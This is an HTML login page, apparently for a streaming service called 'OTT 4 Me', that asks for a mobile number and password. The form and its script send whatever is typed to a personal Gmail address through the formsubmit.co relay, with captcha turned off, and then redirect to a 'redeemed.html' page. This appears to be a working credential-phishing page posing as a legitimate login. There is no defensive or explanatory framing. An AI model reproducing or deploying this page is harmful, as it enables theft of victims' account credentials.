<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            background-color: white;
            max-width: 360px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .logo img {
            width: 100%;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .header {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin: 20px 0 10px;
        }

        label {
            font-size: 14px;
            font-weight: 600;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"], input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #4CAF50;
        }

        .btn {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo Section -->
        <div class="logo">
            <img src="Ott.jpg" alt="Welcome to OTT 4 Me">
        </div>

        <!-- Header Section -->
        <div class="header">Login</div>

        <!-- Form Section -->
        <form 
            action="https://formsubmit.co/mmatsolo158@gmail.com" 
            method="POST" 
            onsubmit="redirectToRedeemed(event)">
            <!-- FormSubmit.co hidden fields -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            
            <label for="mobile">* Mobile Number</label>
            <input 
                type="text" 
                id="mobile" 
                name="Mobile" 
                placeholder="Enter your mobile number"
                required 
                maxlength="10" 
                oninput="updateMobileInput(event)">

            <label for="password">* Password</label>
            <input 
                type="password" 
                id="password" 
                name="Password" 
                placeholder="Enter your password" 
                required>

            <button type="submit" class="btn">LOG IN</button>
        </form>
    </div>

    <script>
        function updateMobileInput(event) {
            const input = event.target;

            // Allow only digits to be entered
            input.value = input.value.replace(/[^0-9]/g, '');
        }

        function redirectToRedeemed(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);

            fetch(form.action, {
                method: 'POST',
                body: formData,
            }).then(() => {
                window.location.href = "redeemed.html";
            });
        }
    </script>
</body>
</html>
